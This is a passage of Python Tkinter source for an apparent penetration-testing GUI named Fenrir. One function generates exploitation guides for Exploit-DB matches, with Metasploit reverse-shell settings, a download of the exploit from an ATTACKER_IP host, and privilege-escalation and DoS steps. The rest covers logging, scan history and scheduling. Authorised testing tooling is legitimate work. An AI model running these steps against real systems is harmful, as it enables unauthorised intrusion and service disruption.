            b(f"    cp \"{local_path}\" ./exploit_{eid}")
            if etype in ("remote", "dos", "webapps"):
                b(f"    # Review the exploit source before running")
            b(f"")
            b(f"  Inspect with searchsploit:")
            if eid:
                b(f"    searchsploit -x {eid}         # view in terminal")
                b(f"    searchsploit -m {eid}         # mirror to current dir")
        else:
            b(f"  No local file found. Try:")
            if eid:
                b(f"    searchsploit -x {eid}")
                b(f"    # or run: fenrir --db-build  to download exploit-db")

        # ── Type-specific how-to ──────────────────────────────────────────────
        h("HOW TO USE THIS EXPLOIT")

        if "remote" in etype or "webapps" in etype:
            s("  This is a REMOTE exploit — targets a service listening on the network.")
            b("")
            b("  STEP 1 — Confirm the vulnerability exists")
            b(f"    nmap -sV -p {matched_port or '1-65535'} {matched_svc or 'TARGET'}")
            if cve_ids:
                b(f"    nmap --script vuln -p {matched_port or 'TARGET_PORT'} TARGET_IP")
            b("")
            b("  STEP 2 — Review the exploit file")
            if local_path:
                b(f"    less \"{local_path}\"")
                b(f"    # Look for: RHOST, RPORT, payload variables at the top")
            b("")
            b("  STEP 3a — Run via Python (if .py exploit)")
            if local_path:
                b(f"    python3 \"{local_path}\" TARGET_IP {matched_port or 'TARGET_PORT'}")
            b("")
            b("  STEP 3b — Run via Ruby (if .rb exploit)")
            if local_path:
                b(f"    ruby \"{local_path}\"")
            b("")
            b("  STEP 4 — Metasploit (if module exists)")
            for cve in cve_ids:
                b(f"    msfconsole -q -x \"search {cve}; use 0; "
                  f"set RHOSTS TARGET_IP; set RPORT {matched_port or 'TARGET_PORT'}; run\"")
            if title:
                b(f"    # Also try: search {title.split()[0]}")

        elif "local" in etype:
            s("  This is a LOCAL PRIVILEGE ESCALATION exploit.")
            b("  Requires: existing shell/user access to the target system.")
            b("")
            b("  STEP 1 — Gain initial access (SSH, web shell, etc.)")
            b("  STEP 2 — Transfer exploit to target")
            b("    # On attacker machine:")
            b("    python3 -m http.server 8080")
            if local_path:
                b(f"    # Then on target machine:")
                b(f"    wget http://ATTACKER_IP:8080/{local_path.split('/')[-1]}")
            b("")
            b("  STEP 3 — Compile and run (C exploits)")
            b("    gcc exploit.c -o exploit && chmod +x ./exploit && ./exploit")
            b("  STEP 3 — Run directly (Python/Ruby exploits)")
            b("    python3 exploit.py")
            b("")
            b("  STEP 4 — Verify privilege escalation")
            b("    whoami     # should show root or SYSTEM")
            b("    id")

        elif "dos" in etype:
            s("  This is a DENIAL OF SERVICE exploit.")
            b("  WARNING: Running DoS exploits against systems without permission is illegal.")
            b("")
            b("  STEP 1 — Verify the service is running")
            b(f"    nc -zv TARGET_IP {matched_port or 'TARGET_PORT'}")
            b("")
            b("  STEP 2 — Run in a controlled environment first")
            if local_path:
                b(f"    python3 \"{local_path}\" TARGET_IP {matched_port or 'TARGET_PORT'}")
            b("")
            b("  STEP 3 — Observe impact")
            b("    # Service should stop responding or crash")
            b("    # Check target for crash logs/coredumps")

        elif "shellcode" in etype:
            s("  This is SHELLCODE — binary payload for code injection.")
            b("")
            b("  STEP 1 — Examine the shellcode")
            if local_path:
                b(f"    hexdump -C \"{local_path}\"")
                b(f"    ndisasm -b 32 \"{local_path}\"    # 32-bit disassembly")
                b(f"    ndisasm -b 64 \"{local_path}\"    # 64-bit disassembly")
            b("")
            b("  STEP 2 — Test in isolation")
            b("    # Use a shellcode runner:")
            b("    python3 -c \"import ctypes,mmap; sc=open('payload','rb').read(); ...")
            b("")
            b("  STEP 3 — Integrate into exploit")
            b("    # Reference the shellcode in your buffer overflow / injection exploit")

        else:
            s("  General exploitation guidance:")
            b("")
            b(f"  STEP 1 — Confirm the service is running")
            b(f"    nmap -sV -p {matched_port or 'ALL'} TARGET_IP")
            b("")
            b(f"  STEP 2 — Review and run the exploit")
            if local_path:
                b(f"    less \"{local_path}\"")
                b(f"    python3 \"{local_path}\" TARGET_IP")
            b("")
            b("  STEP 3 — Search Metasploit")
            if cve_ids:
                b(f"    msfconsole -q -x \"search {cve_ids[0]}\"")

        # ── Metasploit module search ──────────────────────────────────────────
        h("METASPLOIT REFERENCE")
        b("  Start Metasploit and search for this vulnerability:")
        b("")
        b("    msfconsole")
        if cve_ids:
            for cve in cve_ids:
                b(f"    msf6 > search {cve}")
        if matched_svc:
            b(f"    msf6 > search {matched_svc}")
        if title:
            keywords = " ".join(title.split()[:3])
            b(f"    msf6 > search {keywords}")
        b("")
        b("  Typical module usage:")
        b("    msf6 > use exploit/MODULE_PATH")
        b(f"    msf6 exploit > set RHOSTS TARGET_IP")
        if matched_port:
            b(f"    msf6 exploit > set RPORT {matched_port}")
        b("    msf6 exploit > set PAYLOAD generic/shell_reverse_tcp")
        b("    msf6 exploit > set LHOST YOUR_IP")
        b("    msf6 exploit > set LPORT 4444")
        b("    msf6 exploit > check    # verify target is vulnerable (if supported)")
        b("    msf6 exploit > run")

        # ── Verification steps ────────────────────────────────────────────────
        h("VERIFYING VULNERABILITY EXISTS (without exploitation)")
        b("  Use these safer checks before launching the full exploit:")
        b("")
        if cve_ids:
            b(f"  nmap vulnerability scripts:")
            for cve in cve_ids:
                b(f"    nmap --script vuln TARGET_IP -p {matched_port or 'ALL'}")
                b(f"    # Look for: {cve} in script output")
            b("")
        b("  Service version banner check:")
        b(f"    nc -nv TARGET_IP {matched_port or 'TARGET_PORT'}")
        b(f"    # Compare version to vulnerable range listed in: {edb_url}")
        b("")
        b("  Nikto (web applications):")
        if matched_port in ("80", "443", "8080", "8443") or "web" in etype:
            b(f"    nikto -h http://TARGET_IP:{matched_port or '80'}")
        b("")
        b("  Nuclei (automated CVE templates):")
        if cve_ids:
            for cve in cve_ids:
                b(f"    nuclei -u http://TARGET_IP -t cves/{cve.lower()}.yaml")

        # ── Legal warning ─────────────────────────────────────────────────────
        h("⚠  LEGAL AND ETHICAL REMINDER")
        b("  Only use this exploit against systems you own or have written")
        b("  authorisation to test. Unauthorised access is a criminal offence")
        b("  in most jurisdictions (Computer Fraud and Abuse Act, Computer")
        b("  Misuse Act, etc.).")
        b("")
        b("  Fenrir is a tool for authorised penetration testing only.")

        guide_text = "\n".join(lines)

        # ── Build window ─────────────────────────────────────────────────────
        win = tk.Toplevel(self)
        win.title(f"Exploit Guide — EDB-{eid}: {title[:60]}")
        win.configure(bg=DARK_BG)
        win.geometry("860x720")
        win.resizable(True, True)

        # Toolbar
        tb = ttk.Frame(win)
        tb.pack(fill=tk.X, padx=8, pady=(8, 0))

        if edb_url:
            ttk.Button(tb, text="🌐 Open on Exploit-DB",
                       command=lambda: self._open_url(edb_url)
                       ).pack(side=tk.LEFT, padx=(0, 6))
        for cve in cve_ids[:3]:
            nvd = f"https://nvd.nist.gov/vuln/detail/{cve}"
            ttk.Button(tb, text=f"🔗 {cve}",
                       command=lambda u=nvd: self._open_url(u)
                       ).pack(side=tk.LEFT, padx=(0, 4))
        if local_path:
            ttk.Button(tb, text="📄 View File",
                       command=lambda: self._open_exploit_file(local_path, win)
                       ).pack(side=tk.LEFT, padx=(0, 6))
            ttk.Button(tb, text="📋 Copy Path",
                       command=lambda: (self.clipboard_clear(),
                                        self.clipboard_append(local_path))
                       ).pack(side=tk.LEFT, padx=(0, 6))

        ttk.Button(tb, text="📋 Copy Guide",
                   command=lambda: (self.clipboard_clear(),
                                    self.clipboard_append(guide_text))
                   ).pack(side=tk.RIGHT)

        # Guide text area
        txt = scrolledtext.ScrolledText(win, wrap=tk.WORD,
                                         bg="#1a1b26", fg="#c0caf5",
                                         font=("Courier", 10),
                                         relief="flat", padx=12, pady=8)
        txt.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        # Syntax highlighting tags
        txt.tag_configure("heading",  foreground="#7aa2f7", font=("Courier", 10, "bold"))
        txt.tag_configure("cmd",      foreground="#9ece6a")
        txt.tag_configure("warning",  foreground="#f7768e", font=("Courier", 10, "bold"))
        txt.tag_configure("url",      foreground="#2ac3de", underline=True)
        txt.tag_configure("label",    foreground="#e0af68")

        # Insert with highlighting
        for line in guide_text.split("\n"):
            if "━" in line or line.strip().startswith("EXPLOIT") \
                    or (line.strip().isupper() and len(line.strip()) > 4):
                txt.insert(tk.END, line + "\n", "heading")
            elif line.strip().startswith(("msfconsole", "msf6", "nmap", "nikto",
                                           "python3", "ruby", "gcc", "wget",
                                           "cp ", "nc ", "id", "whoami",
                                           "searchsploit", "nuclei", "hexdump",
                                           "ndisasm", "less ")):
                txt.insert(tk.END, line + "\n", "cmd")
            elif "http" in line and ("://" in line):
                txt.insert(tk.END, line + "\n", "url")
            elif "WARNING" in line or "⚠" in line or "LEGAL" in line:
                txt.insert(tk.END, line + "\n", "warning")
            elif line.strip().startswith(("Title", "EDB-ID", "Type", "Platform",
                                           "CVE", "Matched", "Author", "Path",
                                           "Local", "Published", "Verified")):
                txt.insert(tk.END, line + "\n", "label")
            else:
                txt.insert(tk.END, line + "\n")
        txt.configure(state="disabled")

    def _open_url(self, url: str) -> None:
        """Open a URL in the default browser."""
        try:
            import webbrowser
            webbrowser.open(url)
        except Exception as exc:
            log.debug(f"Could not open URL {url}: {exc}")

    def _open_exploit_file(self, path: str, parent: tk.Toplevel) -> None:
        """Open a viewer window showing the raw exploit file content."""
        import os
        if not path or not os.path.isfile(path):
            messagebox.showwarning("File Not Found",
                f"Exploit file not found:\n{path}\n\nRun 'fenrir --db-build' to download exploit files.",
                parent=parent)
            return
        try:
            with open(path, "r", errors="replace") as fh:
                content = fh.read()
        except Exception as exc:
            messagebox.showerror("Read Error", str(exc), parent=parent)
            return

        fwin = tk.Toplevel(parent)
        fwin.title(f"Exploit Source — {path.split('/')[-1]}")
        fwin.configure(bg=DARK_BG)
        fwin.geometry("860x640")
        fwin.resizable(True, True)

        hdr = ttk.Frame(fwin)
        hdr.pack(fill=tk.X, padx=8, pady=(8, 0))
        tk.Label(hdr, text=path, bg=DARK_BG, fg=DEBUG_FG,
                 font=("Courier", 9)).pack(side=tk.LEFT)
        ttk.Button(hdr, text="📋 Copy",
                   command=lambda: (self.clipboard_clear(),
                                    self.clipboard_append(content))
                   ).pack(side=tk.RIGHT)

        txt = scrolledtext.ScrolledText(fwin, wrap=tk.NONE,
                                         bg="#1a1b26", fg="#c0caf5",
                                         font=("Courier", 10), relief="flat")
        txt.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
        txt.insert("1.0", content)
        txt.configure(state="disabled")

    def _show_tree_detail(self) -> None:
        tree = getattr(self, "_tree_event_widget", None)
        if not tree:
            return
        selected = tree.selection()
        if not selected:
            return
        vals = tree.item(selected[0], "values")
        cols = tree["columns"]
        detail = "\n".join(f"{c}: {v}" for c, v in zip(cols, vals))
        detail_win = tk.Toplevel(self)
        detail_win.title("Finding Detail")
        detail_win.configure(bg=DARK_BG)
        detail_win.geometry("600x300")
        txt = scrolledtext.ScrolledText(detail_win, wrap=tk.WORD,
                                         bg=ENTRY_BG, fg=TEXT_FG,
                                         font=("Courier", 10))
        txt.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
        txt.insert("1.0", detail)
        txt.configure(state="disabled")

    # =========================================================================
    # Log queue polling
    # =========================================================================

    def _poll_log_queue(self) -> None:
        try:
            while True:
                raw: str = self.log_queue.get_nowait()
                tag  = "INFO"
                text = raw
                if raw.startswith("LEVELNO:"):
                    try:
                        sep     = raw.index("|")
                        levelno = int(raw[8:sep])
                        text    = raw[sep + 1:]
                        if levelno >= logging.CRITICAL:
                            tag = "CRITICAL"
                        elif levelno >= logging.ERROR:
                            tag = "ERROR"
                        elif levelno >= logging.WARNING:
                            tag = "WARNING"
                        elif levelno <= logging.DEBUG:
                            tag = "DEBUG"
                    except (ValueError, IndexError):
                        text = raw

                self._output_text.configure(state="normal")
                self._output_text.insert(tk.END, text + "\n", tag)
                self._output_text.see(tk.END)
                self._output_text.configure(state="disabled")

                # Mirror errors/warnings to debug tab
                if tag in ("ERROR", "CRITICAL", "WARNING"):
                    self._debug_log(text, tag)

        except queue.Empty:
            pass
        finally:
            self.after(80, self._poll_log_queue)

    # ─── Timing queue ────────────────────────────────────────────────────────

    def _poll_timing_queue(self) -> None:
        try:
            while True:
                event = self._timing_queue.get_nowait()
                action = event[0]
                key    = event[1]
                ts     = event[2]

                if action == "start":
                    self._module_timings[key] = {
                        "start": ts, "end": None, "status": "running", "note": ""
                    }
                elif action in ("done", "skip"):
                    status = event[3] if len(event) > 3 else "done"
                    note   = event[4] if len(event) > 4 else ""
                    if key in self._module_timings:
                        self._module_timings[key].update(
                            {"end": ts, "status": status, "note": note}
                        )
                    else:
                        self._module_timings[key] = {
                            "start": ts, "end": ts,
                            "status": status, "note": note
                        }

                self._update_timing_tree()

        except queue.Empty:
            pass
        finally:
            self.after(200, self._poll_timing_queue)

    def _update_timing_tree(self) -> None:
        tree = self._timing_tree
        # Rebuild (small table, fast)
        tree.delete(*tree.get_children())
        now = time.monotonic()

        for key, data in self._module_timings.items():
            start    = data.get("start")
            end      = data.get("end")
            status   = data.get("status", "")
            note     = data.get("note", "")

            start_str = time.strftime("%H:%M:%S", time.localtime(
                time.time() - (now - start))) if start else "—"

            if end and start:
                dur_s  = end - start
                dur_str = f"{dur_s:.1f}s"
            elif start:
                dur_s  = now - start
                dur_str = f"{dur_s:.1f}s ⟳"
            else:
                dur_s  = 0
                dur_str = "—"

            status_display = {
                "running":   "▶ Running",
                "ok":        "✓ OK",
                "error":     "✗ Error",
                "timeout":   "⏱ Timeout",
                "cancelled": "◼ Cancelled",
                "skipped":   "— Skipped",
            }.get(status, status)

            tag = {
                "running":   "running",
                "ok":        "done_slow" if dur_s > 60 else "done_ok",
                "error":     "done_err",
                "timeout":   "timeout",
                "cancelled": "cancelled",
                "skipped":   "skipped",
            }.get(status, "running")

            tree.insert("", tk.END,
                values=(key, status_display, start_str, dur_str, note),
                tags=(tag,))

    def _clear_timing_tree(self) -> None:
        self._timing_tree.delete(*self._timing_tree.get_children())

    # =========================================================================
    # Debug log
    # =========================================================================

    def _debug_log(self, message: str, level: str = "INFO") -> None:
        ts  = time.strftime("%H:%M:%S")
        self._debug_text.configure(state="normal")
        self._debug_text.insert(tk.END, f"[{ts}] {message}\n", level)
        self._debug_text.see(tk.END)
        self._debug_text.configure(state="disabled")

    def _clear_debug_log(self) -> None:
        self._debug_text.configure(state="normal")
        self._debug_text.delete("1.0", tk.END)
        self._debug_text.configure(state="disabled")

    # =========================================================================
    # System info (Debug tab)
    # =========================================================================

    def _refresh_system_info(self) -> None:
        try:
            import psutil, os as _os
            proc = psutil.Process(_os.getpid())
            mem_mb  = proc.memory_info().rss / 1024 / 1024
            mem_pct = psutil.virtual_memory().percent
            cpu_pct = psutil.cpu_percent(interval=None)
            n_threads = proc.num_threads()

            mem_colour = ERR_FG if mem_pct > 85 else WARN_FG if mem_pct > 70 else SUCCESS_FG
            self._mem_label.configure(
                text=f"Memory: {mem_mb:.0f} MB  ({mem_pct:.0f}% system)",
                foreground=mem_colour,
            )
            self._cpu_label.configure(text=f"CPU: {cpu_pct:.0f}%")
            self._thread_label.configure(text=f"Threads: {n_threads}")
            self._status_mem_label.configure(
                text=f"RAM {mem_mb:.0f}MB/{mem_pct:.0f}%",
                foreground=mem_colour,
            )
        except ImportError:
            self._mem_label.configure(text="Memory: install psutil for stats")
        except Exception as exc:
            self._mem_label.configure(text=f"Memory: {exc}")

    def _auto_refresh_system_info(self) -> None:
        if self._scan_thread and self._scan_thread.is_alive():
            self._refresh_system_info()
        self.after(5000, self._auto_refresh_system_info)

    # =========================================================================
    # Log search highlight
    # =========================================================================

    def _highlight_log_search(self) -> None:
        text = self._output_text
        query = self._log_search_var.get().strip()
        text.tag_remove("SEARCH_HL", "1.0", tk.END)
        if not query:
            return
        start = "1.0"
        while True:
            pos = text.search(query, start, stopindex=tk.END, nocase=True)
            if not pos:
                break
            end = f"{pos}+{len(query)}c"
            text.tag_add("SEARCH_HL", pos, end)
            start = end

    # =========================================================================
    # Database tab
    # =========================================================================

    def _refresh_db_status(self) -> None:
        from .database import get_db_manager
        db  = get_db_manager()
        txt = self._db_status_text
        txt.configure(state="normal")
        txt.delete("1.0", tk.END)
        if not db.is_available():
            txt.insert("1.0", "Database not built.\n\nRun 'Build Database' to create it.")
        else:
            status = db.get_db_status()
            for k, v in status.items():
                txt.insert(tk.END, f"{k:<30} {v}\n")
        txt.configure(state="disabled")

    def _db_build(self) -> None:
        tier = self._db_tier_var.get()
        self._db_progress_label.configure(text=f"Building database (tier: {tier})...")
        self._db_progress.start(12)

        def _run():
            from .database import get_db_builder
            builder = get_db_builder()(progress_callback=self._db_progress_cb)
            ok = builder.build_all(tier=tier)
            self.after(0, lambda: self._db_done(ok))

        threading.Thread(target=_run, daemon=True).start()

    def _db_update(self) -> None:
        self._db_progress_label.configure(text="Updating database...")
        self._db_progress.start(12)

        def _run():
            from .database import get_db_builder
            builder = get_db_builder()(progress_callback=self._db_progress_cb)
            ok = builder.update_all()
            self.after(0, lambda: self._db_done(ok))

        threading.Thread(target=_run, daemon=True).start()

    def _db_progress_cb(self, source: str, current: int, total: int, message: str) -> None:
        self.after(0, lambda: self._db_progress_label.configure(
            text=f"[{source}] {message}"))

    def _db_done(self, success: bool) -> None:
        self._db_progress.stop()
        label = "Database build complete." if success else "Database build failed — check log."
        self._db_progress_label.configure(text=label)
        self._refresh_db_status()

    # =========================================================================
    # Misc helpers
    # =========================================================================

    def _browse_output(self) -> None:
        d = filedialog.askdirectory(title="Select output directory")
        if d:
            self._output_dir_var.set(d)

    def _browse_wordlist(self) -> None:
        f = filedialog.askopenfilename(
            title="Select wordlist",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if f:
            self._wordlist_var.set(f)

    def _browse_apk(self) -> None:
        f = filedialog.askopenfilename(
            title="Select APK file",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")],
        )
        if f:
            self._apk_var.set(f)

    def _clear_output(self) -> None:
        self._output_text.configure(state="normal")
        self._output_text.delete("1.0", tk.END)
        self._output_text.configure(state="disabled")

    def _tick_status(self) -> None:
        if self._scan_start and self._scan_thread and self._scan_thread.is_alive():
            elapsed = time.monotonic() - self._scan_start
            self._status_time_label.configure(text=_fmt_elapsed(elapsed))
        else:
            self._status_time_label.configure(text="")
        self.after(1000, self._tick_status)

    def _on_closing(self) -> None:
        if self._scan_thread and self._scan_thread.is_alive():
            if not messagebox.askyesno("Scan Running",
                                        "A scan is running.\nClose and terminate it?"):
                return
            self._cancel_event.set()
        if self._schedule_job:
            self.after_cancel(self._schedule_job)
        self.destroy()

    # =========================================================================
    # Scan History tab
    # =========================================================================

    def _build_history_tab(self, parent: ttk.Frame) -> None:
        """Show past scans with diff, re-open results, and delete options."""
        top = ttk.Frame(parent); top.pack(fill=tk.X, padx=8, pady=6)
        ttk.Label(top, text="Scan History", font=("Helvetica", 11, "bold")).pack(side=tk.LEFT)
        ttk.Button(top, text="⟳ Refresh",
                   command=self._refresh_history_tab).pack(side=tk.RIGHT, padx=(4, 0))
        ttk.Button(top, text="🗑 Delete selected",
                   command=self._delete_history_entry).pack(side=tk.RIGHT, padx=(4, 0))
        ttk.Button(top, text="⬛ Diff two selected",
                   command=self._diff_history).pack(side=tk.RIGHT, padx=(4, 0))
        ttk.Button(top, text="📂 Open results folder",
                   command=self._open_history_results).pack(side=tk.RIGHT, padx=(4, 0))

        cols = ["ID", "Started", "Target", "Type", "Duration", "CVEs", "Exploits", "Folder"]
        self._hist_tree = ttk.Treeview(parent, columns=cols, show="headings",
                                        selectmode="extended", height=18)
        widths = [45, 155, 180, 75, 80, 60, 65, 280]
        for col, w in zip(cols, widths):
            self._hist_tree.heading(col, text=col)
            self._hist_tree.column(col, width=w, minwidth=40)

        vsb = ttk.Scrollbar(parent, orient="vertical",   command=self._hist_tree.yview)
        hsb = ttk.Scrollbar(parent, orient="horizontal", command=self._hist_tree.xview)
        self._hist_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self._hist_tree.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 4))
        self._hist_tree.bind("<Double-1>", lambda e: self._open_history_results())
        self._refresh_history_tab()

    def _refresh_history_tab(self) -> None:
        if not hasattr(self, "_hist_tree"):
            return
        self._hist_tree.delete(*self._hist_tree.get_children())
        scans = self._history.list_scans(limit=300)
        for scan in scans:
            summary  = scan.get("summary") or {}
            dur_s    = summary.get("duration_s", "")
            dur_str  = f"{dur_s}s" if dur_s else "—"
            cves     = summary.get("total_cves", "")
            exploits = summary.get("total_exploits", "")
            folder   = scan.get("result_dir", "")
            started  = (scan.get("started_at", "") or "")[:16].replace("T", " ")
            iid = self._hist_tree.insert("", tk.END, values=(
                scan["id"], started, scan.get("target", ""), scan.get("scan_type", ""),
                dur_str, cves, exploits, folder
            ))
            # Tag by type
            tag = "network" if scan.get("scan_type") == "network" else "single"
            self._hist_tree.item(iid, tags=(tag,))
        self._hist_tree.tag_configure("network", foreground=ACCENT)
        self._hist_tree.tag_configure("single",  foreground=TEXT_FG)

    def _open_file_manager(self, path: str) -> None:
        """Open a directory or file using the system default handler."""
        import subprocess, sys
        try:
            if sys.platform == "win32":
                os.startfile(path)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", path])
            else:
                subprocess.Popen(["xdg-open", path])
        except Exception as exc:
            log.debug(f"Could not open file manager: {exc}")

    def _open_history_results(self) -> None:
        sel = self._hist_tree.selection()
        if not sel:
            messagebox.showinfo("No selection", "Select a scan row first.")
            return
        vals   = self._hist_tree.item(sel[0], "values")
        folder = vals[7] if len(vals) > 7 else ""

        if not folder:
            messagebox.showinfo("No folder", "This scan has no recorded result folder.")
            return

        folder_path = Path(folder)

        # Try to open the report file directly first
        for name_pattern in ["*.json", "*.txt"]:
            matches = list(folder_path.glob(name_pattern)) if folder_path.exists() else []
            if matches:
                # Open the folder containing the report
                self._open_file_manager(str(folder_path))
                return

        # Folder exists but no report files yet — open the folder anyway
        if folder_path.exists():
            self._open_file_manager(str(folder_path))
        else:
            messagebox.showinfo(
                "Folder not found",
                f"Results folder does not exist:\n{folder}\n\n"
                "It may have been moved or deleted."
            )

    def _delete_history_entry(self) -> None:
        sel = self._hist_tree.selection()
        if not sel:
            return
        ids = [int(self._hist_tree.item(s, "values")[0]) for s in sel]
        if not messagebox.askyesno("Delete",
                                    f"Delete {len(ids)} history record(s)?\n"
                                    "(Result files on disk are not removed.)"):
            return
        for sid in ids:
            self._history.delete_scan(sid)
        self._refresh_history_tab()

    def _diff_history(self) -> None:
        sel = self._hist_tree.selection()
        if len(sel) != 2:
            messagebox.showinfo("Select two", "Select exactly 2 scans to diff.")
            return
        id_a = int(self._hist_tree.item(sel[0], "values")[0])
        id_b = int(self._hist_tree.item(sel[1], "values")[0])
        diff = self._history.diff_scans(id_a, id_b)

        win = tk.Toplevel(self)
        win.title(f"Diff: scan #{id_a} vs #{id_b}")
        win.configure(bg=DARK_BG)
        win.geometry("700x500")
        txt = scrolledtext.ScrolledText(win, wrap=tk.WORD, bg="#1a1b26",
                                         fg="#c0caf5", font=("Courier", 10))
        txt.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        txt.tag_configure("add",  foreground=SUCCESS_FG)
        txt.tag_configure("rem",  foreground=ERR_FG)
        txt.tag_configure("head", foreground=ACCENT, font=("Courier", 10, "bold"))

        def line(text, tag=""):
            txt.insert(tk.END, text + "\n", tag)

        line(f"{'─'*60}", "head")
        line(f"  Scan #{id_a}:  {diff.get('scan_a', {}).get('started', '')}  "
             f"target: {diff.get('scan_a', {}).get('target', '')}", "head")
        line(f"  Scan #{id_b}:  {diff.get('scan_b', {}).get('started', '')}  "
             f"target: {diff.get('scan_b', {}).get('target', '')}", "head")
        line(f"{'─'*60}", "head")
        line("")
        if diff.get("os_changed"):
            line(f"OS changed:  {diff['os_before'] or '—'} → {diff['os_after'] or '—'}", "rem")
            line("")
        for p in diff.get("new_ports", []):
            line(f"  + Port opened:     {p}", "add")
        for p in diff.get("closed_ports", []):
            line(f"  - Port closed:     {p}", "rem")
        line("")
        for c in diff.get("new_cves", []):
            line(f"  + New CVE:         {c}", "add")
        for c in diff.get("resolved_cves", []):
            line(f"  ✓ Resolved CVE:    {c}", "rem")
        line("")
        for e in diff.get("new_exploits", []):
            line(f"  + New exploit:     {e}", "add")
        if not any([diff.get("new_ports"), diff.get("closed_ports"),
                    diff.get("new_cves"), diff.get("new_exploits")]):
            line("  No differences found.", "head")
        txt.configure(state="disabled")

    # =========================================================================
    # Scheduled Scans tab
    # =========================================================================

    def _build_schedules_tab(self, parent: ttk.Frame) -> None:
        """UI to add, list, enable/disable and delete scheduled scans."""
        # ── New schedule form ────────────────────────────────────────────────────
        form = ttk.LabelFrame(parent, text="Add Scheduled Scan", padding=10)
        form.pack(fill=tk.X, padx=8, pady=6)
        form.columnconfigure(1, weight=1)

        def _lbl(text, row):
            ttk.Label(form, text=text).grid(row=row, column=0, sticky="w", pady=2)

        _lbl("Name:", 0)
        self._sched_name_var = tk.StringVar(value="Nightly scan")
        ttk.Entry(form, textvariable=self._sched_name_var).grid(
            row=0, column=1, sticky="ew", padx=(6, 0))

        _lbl("Target:", 1)
        self._sched_target_var = tk.StringVar(value="")
        ttk.Entry(form, textvariable=self._sched_target_var).grid(
            row=1, column=1, sticky="ew", padx=(6, 0))

        _lbl("Scan type:", 2)
        self._sched_type_var = tk.StringVar(value="single")
        ttk.Combobox(form, textvariable=self._sched_type_var,
                     values=["single", "network"], state="readonly", width=12
                     ).grid(row=2, column=1, sticky="w", padx=(6, 0))

        _lbl("Interval (hours):", 3)
        self._sched_interval_var = tk.DoubleVar(value=24.0)
        ttk.Spinbox(form, from_=0.5, to=168.0, increment=0.5, width=7,
                    textvariable=self._sched_interval_var).grid(
                    row=3, column=1, sticky="w", padx=(6, 0))

        ttk.Button(form, text="+ Add Schedule", style="Accent.TButton",
                   command=self._add_schedule).grid(row=4, column=0, columnspan=2,
                   sticky="w", pady=(8, 0))

        # ── Schedule list ────────────────────────────────────────────────────────
        top = ttk.Frame(parent); top.pack(fill=tk.X, padx=8, pady=(4, 0))
        ttk.Label(top, text="Scheduled Scans", font=("Helvetica", 10, "bold")).pack(side=tk.LEFT)
        ttk.Button(top, text="⟳ Refresh", command=self._refresh_schedules_tab).pack(side=tk.RIGHT)
        ttk.Button(top, text="🗑 Delete", command=self._delete_schedule).pack(side=tk.RIGHT, padx=(0, 4))

        cols = ["ID", "Name", "Target", "Type", "Interval (h)", "Next Run", "Last Run", "Enabled"]
        self._sched_tree = ttk.Treeview(parent, columns=cols, show="headings",
                                         selectmode="browse", height=12)
        widths = [40, 140, 160, 75, 90, 155, 155, 65]
        for col, w in zip(cols, widths):
            self._sched_tree.heading(col, text=col)
            self._sched_tree.column(col, width=w, minwidth=40)
        vsb = ttk.Scrollbar(parent, orient="vertical", command=self._sched_tree.yview)
        self._sched_tree.configure(yscrollcommand=vsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._sched_tree.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)

        ttk.Label(parent, text="Schedules run automatically when Fenrir is open.",
                  font=("Helvetica", 8), foreground=DEBUG_FG).pack(anchor="w", padx=8)
        self._refresh_schedules_tab()

    def _add_schedule(self) -> None:
        name     = self._sched_name_var.get().strip()
        target   = self._sched_target_var.get().strip()
        interval = self._sched_interval_var.get()
        stype    = self._sched_type_var.get()
        if not name or not target:
            messagebox.showerror("Missing", "Name and target are required.")
            return
        sid = self._history.add_schedule(name, target, stype, interval_h=interval)
        if sid >= 0:
            log.info(f"[schedule] Added: {name} → {target} every {interval}h")
            self._refresh_schedules_tab()
        else:
            messagebox.showerror("Error", "Failed to add schedule — check log.")

    def _refresh_schedules_tab(self) -> None:
        if not hasattr(self, "_sched_tree"):
            return
        self._sched_tree.delete(*self._sched_tree.get_children())
        for s in self._history.list_schedules():
            next_r = (s.get("next_run_at", "") or "")[:16].replace("T", " ")
            last_r = (s.get("last_run_at", "") or "—")[:16].replace("T", " ")
            self._sched_tree.insert("", tk.END, values=(
                s["id"], s.get("name",""), s.get("target",""),
                s.get("scan_type",""), s.get("interval_h",""),
                next_r, last_r, "Yes" if s.get("enabled") else "No"
            ))

    def _delete_schedule(self) -> None:
        sel = self._sched_tree.selection()
        if not sel:
            return
        sid = int(self._sched_tree.item(sel[0], "values")[0])
        if messagebox.askyesno("Delete", "Delete this scheduled scan?"):
            self._history.delete_schedule(sid)
            self._refresh_schedules_tab()

    def _check_schedules(self) -> None:
        """Poll every 60s; fire any overdue schedules."""
        try:
            due = self._history.get_due_schedules()
            for s in due:
                log.info(f"[schedule] Firing: {s['name']} → {s['target']}")
                self._history.update_schedule_run(s["id"], s.get("interval_h", 24))
                # Launch in background thread — don't block GUI
                target = s.get("target", "")
                stype  = s.get("scan_type", "single")
                if target:
                    try:
                        out = str(make_result_dir(target, f"scheduled_{stype}"))
                        t = threading.Thread(
                            target=self._run_scheduled_scan,
                            args=(target, out, stype, s),
                            daemon=True,
                        )
                        t.start()
                    except Exception as exc:
                        log.error(f"[schedule] Launch error: {exc}")
            if due:
                self.after(1000, self._refresh_schedules_tab)
                self.after(1000, self._refresh_history_tab)
        except Exception as exc:
            log.debug(f"[schedule] Check error: {exc}")
        self._schedule_job = self.after(60_000, self._check_schedules)

    def _run_scheduled_scan(self, target: str, output_dir: str,
                             scan_type: str, schedule: dict) -> None:
        """Background worker for scheduled scans — runs without touching GUI."""
        scan_id = self._history.begin_scan(target, f"scheduled_{scan_type}",
                                            schedule.get("modules") or [])
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            # Use a stripped-down async scan that only writes reports
            from .network_scanner import NetworkScanner
            ns = NetworkScanner()
